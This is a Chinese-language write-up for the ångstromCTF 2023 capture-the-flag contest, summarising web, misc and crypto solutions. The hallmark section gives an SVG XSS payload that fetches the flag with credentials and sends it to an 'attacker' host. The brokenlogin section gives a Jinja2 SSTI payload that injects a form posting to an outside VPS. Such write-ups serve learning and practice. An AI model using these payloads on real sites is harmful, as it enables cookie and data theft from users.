---
title: ångstromCTF 2023 WP
contest: ångstromCTF
year: 2023
difficulty: mixed
vuln_type: web_unknown
tags: [js-swap-reverse, directory-traversal, SVG-XSS, jinja2-SSTI, host-header, http-smuggling, AES-CBC, cookie-tampering, race-condition, bch-code]
attack_chain: WEB 类：catch me if you can 抓包 flag/shortcircuit 反写 swap3/directory 1-5000 遍历 id/hallmark SVG XSS type[]=image/svg+xml/brokenlogin jinja2 SSTI 25字节限制+request.args|safe 绕 escape/Celeste Speedrunning 时间戳溢出/Celeste Tunneling Host: flag.local/MISC 类：Pusheen.txt zip base64 反解/Extremely Safe Vault 65537 RSA + 65535 e 二项式/Simple Storage Program 翻转位+对称差/Catch me if you can PAC 替换/CRYPTO 类：BB prng 爆破/Coordinate Descent 8 维 step down 找解
key_payload: hallmark.svg = <svg><script>xmlhttp=new XMLHttpRequest();xmlhttp.withCredentials=true;...;xmlhttp.open('GET','https://hallmark.web.actf.co/flag',true);xmlhttp.send();</script></svg>  brokenlogin ?message={{request.args|safe}}&r=<form action=http://vps/ method=POST>...</form><!--
one_liner: ångstromCTF 2023 综合 WP，覆盖 Web 入门到 Jinja2 SSTI 提权、Misc 文件还原、Crypto RSA/LFSR/坐标下降等多个领域。
lesson: SVG XSS 需 url 编码；Jinja2 `render_template_string(page, fails=fails)` 中 `fails` 用户可控可注入；Host 头走私走 SECRETSITE 比对；Python zipfile 还原 base64 串；AES-CBC 字节翻转需改前一密文块对应字节。
quality: high
---

# ångstromCTF 2023 WP

## 概览
ångstromCTF 2023 综合 WP，涵盖 WEB/MISC/CRYPTO 多领域 25+ 题目。

## WEB 类

### catch me if you can
签到题，抓包看返回包直接拿 flag。

### shortcircuit
JS 客户端交换数组，swap3 函数：
```js
const swap3 = (x) => {
    let t2 = x[3]; x[3] = x[2]; x[2] = t2;
    t2 = x[1]; x[1] = x[3]; x[3] = t2;
    t2 = x[2]; x[2] = x[1]; x[1] = t2;
    t2 = x[0]; x[0] = x[3]; x[3] = t2;
    return x;
};
```
反写 swap 函数 + chunk('7e08...', 30).join()。

### directory
http://directory.web.actf.co/ 遍历 1-5000，第 3054 个 .html 有 flag。

### hallmark
SVG XSS：
- type[]=image/svg+xml 数组绕过 `type == "image/svg+xml"` 检查
- content 写 `<svg><script>xmlhttp.open('GET','https://hallmark.web.actf.co/flag',true);...window.open('http://attacker/?flag='+responseText)</script></svg>`
- 全部 URL 编码

### brokenlogin
Jinja2 SSTI + 25 字节限制：
- 漏洞代码：`render_template_string(indexPage % custom_message, fails=fails)` 中 custom_message = escape(request.args["message"])
- escape 转移 `& < > ' "`，但 message 长度 < 25 才能进入分支（否则 fail）
- payload：`?message={{request.args|safe}}&r=<form action="http://vps/" method="POST">...<form><!--`
- request.args|safe 让消息参数重新渲染为模板，可注入 form 表单让 admin bot 提交

### Celeste Speedrunning Association
时间戳溢出：https://mount-tunnel.web.actf.co/play 抓 /play 请求，发送极大时间戳（接近 64-bit 上限）得 flag。

### Celeste Tunneling Association
Host 头走私：单个 Host: flag.local 时触发 FLAG 响应。

## MISC 类
- Pusheen.txt: zip 内文件 base64 串还原
- Extremely Safe Vault: 65537 RSA + e=65535 二项式攻击
- Simple Storage Program: 位翻转 + 对称差
- Catch me if you can: PAC (Proxy Auto-Config) 文件替换
- Schrödinger: BCH 纠错码

## CRYPTO 类
- BB: prng 爆破
- Coordinate Descent: 8 维坐标下降法找最小解
- Encrypted Notes: AES-CBC 字节翻转
- Two-time pad: 多密钥 OTP 攻击
- RSALCG: LCG + RSA 组合

## 经验提炼
- SVG XSS 需要 URL 编码才能传上去
- Jinja2 `render_template_string(page, fails=fails)` 中 fails 用户可控可注入
- `request.args|safe` 关闭自动转义是经典 SSTI 触发点
- Host 头走私匹配 SECRETSITE 是常见 CTF 套路
- Python zipfile + base64 串还原是 MISC 入门题套路
- AES-CBC 字节翻转要改前一密文块对应字节，PKCS#7 padding 注意边界
- BCH 纠错码需要 z3 或 Reed-Solomon 库支持
